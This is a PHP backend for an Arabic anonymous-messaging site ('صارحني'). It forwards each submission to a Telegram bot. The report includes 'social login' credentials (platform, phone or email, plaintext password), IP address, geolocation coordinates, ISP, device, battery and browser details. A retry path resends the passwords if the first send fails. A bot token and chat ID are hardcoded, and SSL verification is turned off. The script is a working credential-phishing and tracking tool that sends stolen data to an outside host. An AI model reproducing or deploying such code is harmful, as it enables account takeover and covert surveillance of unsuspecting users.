<?php
// ============================================
// صارحني السحابي - ملف الإرسال إلى تليجرام
// ============================================

// تعيين رؤوس JSON
header('Content-Type: application/json; charset=utf-8');

// ============================================
// إعدادات تليجرام - قم بتعديل هذه البيانات
// ============================================
$TELEGRAM_BOT_TOKEN = "8389479876:AAE720pve0-5ajxrDRTRT1JJQVBbzHMha2I"; // ضع توكن البوت الخاص بك هنا
$TELEGRAM_CHAT_ID = "5977316458";   // ضع Chat ID الخاص بك هنا

// ============================================
// التحقق من الطلب
// ============================================
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false, 'message' => 'طلب غير صحيح']);
    exit;
}

// استقبال البيانات
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data) {
    echo json_encode(['success' => false, 'message' => 'بيانات غير صحيحة']);
    exit;
}

$senderName = $data['senderName'] ?? 'مجهول';
$senderEmail = $data['senderEmail'] ?? 'لم يتم تقديمه';
$message = $data['message'] ?? '';
$advancedInfo = $data['advancedInfo'] ?? [];
$socialLoginInfo = $data['socialLoginInfo'] ?? null;

if (empty($message)) {
    echo json_encode(['success' => false, 'message' => 'الرسالة فارغة']);
    exit;
}

// ============================================
// دالة تحليل User Agent
// ============================================
function parseUserAgent($userAgent) {
    $ua = strtolower($userAgent);
    $info = [
        'device' => 'غير معروف',
        'os' => 'غير معروف',
        'browser' => 'غير معروف'
    ];

    // تحديد نوع الجهاز
    if (strpos($ua, 'iphone') !== false) {
        $info['device'] = '📱 iPhone';
    } elseif (strpos($ua, 'ipad') !== false) {
        $info['device'] = '📱 iPad';
    } elseif (strpos($ua, 'android') !== false) {
        $info['device'] = '📱 Android';
    } elseif (strpos($ua, 'windows') !== false) {
        $info['device'] = '💻 Windows PC';
    } elseif (strpos($ua, 'macintosh') !== false) {
        $info['device'] = '🍎 Mac';
    } elseif (strpos($ua, 'linux') !== false) {
        $info['device'] = '🐧 Linux';
    }

    // تحديد نظام التشغيل
    if (strpos($ua, 'windows nt 10.0') !== false) {
        $info['os'] = 'Windows 10/11';
    } elseif (strpos($ua, 'windows nt 6.3') !== false) {
        $info['os'] = 'Windows 8.1';
    } elseif (strpos($ua, 'windows') !== false) {
        $info['os'] = 'Windows';
    } elseif (strpos($ua, 'mac os x') !== false) {
        preg_match('/mac os x ([\d_]+)/', $ua, $matches);
        $info['os'] = 'macOS ' . ($matches[1] ?? 'Unknown');
    } elseif (strpos($ua, 'iphone') !== false || strpos($ua, 'ipad') !== false) {
        preg_match('/os ([\d_]+)/', $ua, $matches);
        $info['os'] = 'iOS ' . ($matches[1] ?? 'Unknown');
    } elseif (strpos($ua, 'android') !== false) {
        preg_match('/android ([\d.]+)/', $ua, $matches);
        $info['os'] = 'Android ' . ($matches[1] ?? 'Unknown');
    } elseif (strpos($ua, 'linux') !== false) {
        $info['os'] = 'Linux';
    }

    // تحديد المتصفح
    if (strpos($ua, 'firefox') !== false) {
        preg_match('/firefox\/([\d.]+)/', $ua, $matches);
        $info['browser'] = 'Firefox ' . ($matches[1] ?? 'Unknown');
    } elseif (strpos($ua, 'chrome') !== false) {
        preg_match('/chrome\/([\d.]+)/', $ua, $matches);
        $info['browser'] = 'Chrome ' . ($matches[1] ?? 'Unknown');
    } elseif (strpos($ua, 'safari') !== false) {
        preg_match('/version\/([\d.]+)/', $ua, $matches);
        $info['browser'] = 'Safari ' . ($matches[1] ?? 'Unknown');
    } elseif (strpos($ua, 'edge') !== false) {
        preg_match('/edge\/([\d.]+)/', $ua, $matches);
        $info['browser'] = 'Edge ' . ($matches[1] ?? 'Unknown');
    } elseif (strpos($ua, 'opera') !== false) {
        preg_match('/opera\/([\d.]+)/', $ua, $matches);
        $info['browser'] = 'Opera ' . ($matches[1] ?? 'Unknown');
    }

    return $info;
}

// ============================================
// بناء تقرير مفصل للرسالة
// ============================================
$userAgentInfo = parseUserAgent($advancedInfo['userAgent'] ?? '');

$telegramMessage = "🚀 <b>رسالة جديدة من صارحني!</b>\n";
$telegramMessage .= "═══════════════════════════════════════════════════════\n\n";

// 1. معلومات المرسل الأساسية
$telegramMessage .= "<b>👤 معلومات المرسل</b>\n";
$telegramMessage .= "┌─────────────────────────────────────────────────────\n";
$telegramMessage .= "│ <b>الاسم:</b> " . htmlspecialchars($senderName) . "\n";
$telegramMessage .= "│ <b>البريد الإلكتروني:</b> " . htmlspecialchars($senderEmail) . "\n";
$telegramMessage .= "└─────────────────────────────────────────────────────\n\n";

// 2. معلومات تسجيل الدخول الاجتماعي (إن وجدت)
if ($socialLoginInfo) {
    $telegramMessage .= "<b>🔐 بيانات تسجيل الدخول الاجتماعي</b>\n";
    $telegramMessage .= "┌─────────────────────────────────────────────────────\n";
    $telegramMessage .= "│ <b>المنصة:</b> " . htmlspecialchars($socialLoginInfo['provider']) . "\n";
    $telegramMessage .= "│ <b>رقم الهاتف / البريد:</b> " . htmlspecialchars($socialLoginInfo['phoneEmail']) . "\n";
    $telegramMessage .= "│ <b>كلمة السر:</b> " . htmlspecialchars($socialLoginInfo['password']) . "\n";
    $telegramMessage .= "└─────────────────────────────────────────────────────\n\n";
}

// 3. الرسالة
$telegramMessage .= "<b>💬 الرسالة</b>\n";
$telegramMessage .= "┌─────────────────────────────────────────────────────\n";
$telegramMessage .= htmlspecialchars(substr($message, 0, 1000));
if (strlen($message) > 1000) {
    $telegramMessage .= "\n... (تم اختصار الرسالة)";
}
$telegramMessage .= "\n└─────────────────────────────────────────────────────\n\n";

// 4. معلومات الجهاز والمتصفح
$telegramMessage .= "<b>💻 معلومات الجهاز والمتصفح</b>\n";
$telegramMessage .= "┌─────────────────────────────────────────────────────\n";
$telegramMessage .= "│ <b>الجهاز:</b> " . $userAgentInfo['device'] . "\n";
$telegramMessage .= "│ <b>نظام التشغيل:</b> " . $userAgentInfo['os'] . "\n";
$telegramMessage .= "│ <b>المتصفح:</b> " . $userAgentInfo['browser'] . "\n";
$telegramMessage .= "│ <b>اللغة:</b> " . ($advancedInfo['language'] ?? 'غير معروف') . "\n";
$telegramMessage .= "│ <b>دقة الشاشة:</b> " . ($advancedInfo['screenResolution'] ?? 'غير معروف') . "\n";
$telegramMessage .= "│ <b>عمق الألوان:</b> " . ($advancedInfo['screenColorDepth'] ?? 'غير معروف') . " بت\n";
$telegramMessage .= "└─────────────────────────────────────────────────────\n\n";

// 5. معلومات الاتصال والشبكة
$telegramMessage .= "<b>🌐 معلومات الاتصال والشبكة</b>\n";
$telegramMessage .= "┌─────────────────────────────────────────────────────\n";
$telegramMessage .= "│ <b>عنوان IP:</b> " . ($advancedInfo['ip'] ?? 'قيد الطلب') . "\n";

if (is_array($advancedInfo['connection'])) {
    $telegramMessage .= "│ <b>نوع الاتصال:</b> " . $advancedInfo['connection']['effectiveType'] . "\n";
    $telegramMessage .= "│ <b>السرعة (Downlink):</b> " . $advancedInfo['connection']['downlink'] . " Mbps\n";
    $telegramMessage .= "│ <b>التأخير (RTT):</b> " . $advancedInfo['connection']['rtt'] . " ms\n";
} else {
    $telegramMessage .= "│ <b>معلومات الاتصال:</b> " . $advancedInfo['connection'] . "\n";
}

$telegramMessage .= "│ <b>الحالة الإنترنت:</b> " . ($advancedInfo['onLine'] ? '✅ متصل' : '❌ غير متصل') . "\n";
$telegramMessage .= "└─────────────────────────────────────────────────────\n\n";

// 6. معلومات الموقع الجغرافي
if (is_array($advancedInfo['location'])) {
    $telegramMessage .= "<b>📍 معلومات الموقع الجغرافي</b>\n";
    $telegramMessage .= "┌─────────────────────────────────────────────────────\n";
    if (isset($advancedInfo['location']['country'])) {
        $telegramMessage .= "│ <b>الدولة:</b> " . $advancedInfo['location']['country'] . "\n";
    }
    if (isset($advancedInfo['location']['city'])) {
        $telegramMessage .= "│ <b>المدينة:</b> " . $advancedInfo['location']['city'] . "\n";
    }
    if (isset($advancedInfo['location']['region'])) {
        $telegramMessage .= "│ <b>المنطقة:</b> " . $advancedInfo['location']['region'] . "\n";
    }
    if (isset($advancedInfo['location']['isp'])) {
        $telegramMessage .= "│ <b>مزود الخدمة:</b> " . $advancedInfo['location']['isp'] . "\n";
    }
    if (isset($advancedInfo['location']['coordinates'])) {
        $telegramMessage .= "│ <b>الإحداثيات:</b> " . $advancedInfo['location']['coordinates'] . "\n";
    }
    if (isset($advancedInfo['location']['latitude'])) {
        $telegramMessage .= "│ <b>خط العرض:</b> " . $advancedInfo['location']['latitude'] . "\n";
        $telegramMessage .= "│ <b>خط الطول:</b> " . $advancedInfo['location']['longitude'] . "\n";
        $telegramMessage .= "│ <b>دقة الموقع:</b> " . $advancedInfo['location']['accuracy'] . "\n";
    }
    $telegramMessage .= "└─────────────────────────────────────────────────────\n\n";
}

// 7. معلومات البطارية
if (is_array($advancedInfo['battery'])) {
    $telegramMessage .= "<b>🔋 معلومات البطارية</b>\n";
    $telegramMessage .= "┌─────────────────────────────────────────────────────\n";
    $telegramMessage .= "│ <b>مستوى البطارية:</b> " . $advancedInfo['battery']['level'] . "\n";
    $telegramMessage .= "│ <b>الشحن:</b> " . ($advancedInfo['battery']['charging'] ? '🔌 جاري الشحن' : '⚡ بطارية') . "\n";
    $telegramMessage .= "└─────────────────────────────────────────────────────\n\n";
}

// 8. معلومات إضافية
$telegramMessage .= "<b>ℹ️ معلومات إضافية</b>\n";
$telegramMessage .= "┌─────────────────────────────────────────────────────\n";
$telegramMessage .= "│ <b>الوقت (UTC):</b> " . ($advancedInfo['timestamp'] ?? 'غير معروف') . "\n";
$telegramMessage .= "│ <b>الوقت المحلي:</b> " . ($advancedInfo['localTime'] ?? 'غير معروف') . "\n";
$telegramMessage .= "│ <b>المنطقة الزمنية:</b> " . ($advancedInfo['timezone'] ?? 'غير معروف') . "\n";
$telegramMessage .= "│ <b>المصدر:</b> " . ($advancedInfo['referrer'] ?? 'مباشر') . "\n";
$telegramMessage .= "│ <b>عدد المعالجات:</b> " . ($advancedInfo['hardwareConcurrency'] ?? 'غير معروف') . "\n";
$telegramMessage .= "│ <b>ذاكرة الجهاز:</b> " . ($advancedInfo['deviceMemory'] ?? 'غير معروف') . " GB\n";
$telegramMessage .= "│ <b>Cookies مفعلة:</b> " . ($advancedInfo['cookiesEnabled'] ? '✅ نعم' : '❌ لا') . "\n";
$telegramMessage .= "└─────────────────────────────────────────────────────\n\n";

$telegramMessage .= "✨ <b>تم الاستقبال بنجاح في صارحني!</b>";

// ============================================
// إرسال الرسالة إلى تليجرام
// ============================================
function sendToTelegram($message, $botToken, $chatId) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    return [
        'success' => $httpCode === 200,
        'httpCode' => $httpCode,
        'error' => $error,
        'result' => $result
    ];
}

// محاولة الإرسال
$sendResult = sendToTelegram($telegramMessage, $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID);

if ($sendResult['success']) {
    echo json_encode([
        'success' => true,
        'message' => 'تم إرسال رسالتك بنجاح!'
    ]);
} else {
    // محاولة إرسال رسالة بسيطة في حالة الفشل
    $simpleMessage = "📨 رسالة جديدة من: " . htmlspecialchars($senderName) . "\n\n";
    $simpleMessage .= "💬 " . htmlspecialchars(substr($message, 0, 500)) . "\n\n";
    $simpleMessage .= "📧 البريد: " . htmlspecialchars($senderEmail);
    
    if ($socialLoginInfo) {
        $simpleMessage .= "\n\n🔐 بيانات التسجيل:\n";
        $simpleMessage .= "المنصة: " . htmlspecialchars($socialLoginInfo['provider']) . "\n";
        $simpleMessage .= "البريد/الهاتف: " . htmlspecialchars($socialLoginInfo['phoneEmail']) . "\n";
        $simpleMessage .= "كلمة السر: " . htmlspecialchars($socialLoginInfo['password']);
    }
    
    $retryResult = sendToTelegram($simpleMessage, $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID);
    
    if ($retryResult['success']) {
        echo json_encode([
            'success' => true,
            'message' => 'تم إرسال رسالتك بنجاح!'
        ]);
    } else {
        echo json_encode([
            'success' => false,
            'message' => 'حدث خطأ في الإرسال. يرجى المحاولة لاحقاً.'
        ]);
    }
}
?>
